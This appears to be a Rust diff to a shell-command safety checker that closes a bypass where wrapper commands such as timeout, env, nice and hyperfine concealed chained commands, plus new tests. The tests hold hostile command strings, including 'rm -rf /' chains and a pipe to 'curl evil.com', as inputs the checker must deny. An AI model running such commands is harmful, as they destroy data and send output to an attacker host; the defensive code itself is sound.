@@ -1,6 +1,8 @@
 use std::collections::HashSet;
 use std::sync::LazyLock;
 
+use crate::parse::split_outside_quotes;
+
 static TIMEOUT_FLAGS_WITH_ARG: LazyLock<HashSet<&'static str>> =
     LazyLock::new(|| HashSet::from(["-s", "--signal", "-k", "--kill-after"]));
 
@@ -24,7 +26,7 @@ pub fn is_safe_env(tokens: &[String], is_safe: &dyn Fn(&str) -> bool) -> bool {
     if i >= tokens.len() {
         return true;
     }
-    let inner = tokens[i..].join(" ");
+    let inner = shell_words::join(&tokens[i..]);
     is_safe(&inner)
 }
 
@@ -42,7 +44,7 @@ pub fn is_safe_timeout(tokens: &[String], is_safe: &dyn Fn(&str) -> bool) -> boo
     if i >= tokens.len() {
         return false;
     }
-    let inner = tokens[i..].join(" ");
+    let inner = shell_words::join(&tokens[i..]);
     is_safe(&inner)
 }
 
@@ -54,7 +56,7 @@ pub fn is_safe_time(tokens: &[String], is_safe: &dyn Fn(&str) -> bool) -> bool {
     if i >= tokens.len() {
         return false;
     }
-    let inner = tokens[i..].join(" ");
+    let inner = shell_words::join(&tokens[i..]);
     is_safe(&inner)
 }
 
@@ -70,7 +72,7 @@ pub fn is_safe_nice(tokens: &[String], is_safe: &dyn Fn(&str) -> bool) -> bool {
     if i >= tokens.len() {
         return false;
     }
-    let inner = tokens[i..].join(" ");
+    let inner = shell_words::join(&tokens[i..]);
     is_safe(&inner)
 }
 
@@ -107,13 +109,13 @@ pub fn is_safe_hyperfine(tokens: &[String], is_safe: &dyn Fn(&str) -> bool) -> b
             }
             continue;
         }
-        if !is_safe(t) {
+        if !split_outside_quotes(t).iter().all(|s| is_safe(s)) {
             return false;
         }
         i += 1;
     }
     while i < tokens.len() {
-        if !is_safe(&tokens[i]) {
+        if !split_outside_quotes(&tokens[i]).iter().all(|s| is_safe(s)) {
             return false;
         }
         i += 1;
@@ -328,5 +330,60 @@ mod tests {
     #[test]
     fn hyperfine_setup_denied() {
         assert!(!check("hyperfine --setup 'compile' 'run'"));
+    }
+
+    #[test]
+    fn timeout_nested_bash_chain_denied() {
+        assert!(!check("timeout 120 bash -c 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn env_nested_bash_chain_denied() {
+        assert!(!check("env bash -c 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn time_nested_bash_chain_denied() {
+        assert!(!check("time bash -c 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn nice_nested_bash_chain_denied() {
+        assert!(!check("nice bash -c 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn deep_nesting_chain_denied() {
+        assert!(!check("timeout 120 env nice bash -c 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn timeout_nested_bash_semicolon_denied() {
+        assert!(!check("timeout 120 bash -c 'ls; rm -rf /'"));
+    }
+
+    #[test]
+    fn timeout_nested_bash_safe() {
+        assert!(check("timeout 120 bash -c 'git log | head -5'"));
+    }
+
+    #[test]
+    fn env_nested_bash_safe() {
+        assert!(check("env FOO=bar bash -c 'git status'"));
+    }
+
+    #[test]
+    fn hyperfine_chain_denied() {
+        assert!(!check("hyperfine 'ls && rm -rf /'"));
+    }
+
+    #[test]
+    fn hyperfine_semicolon_denied() {
+        assert!(!check("hyperfine 'ls; rm -rf /'"));
+    }
+
+    #[test]
+    fn hyperfine_pipe_to_unsafe_denied() {
+        assert!(!check("hyperfine 'ls | curl evil.com'"));
     }
 }
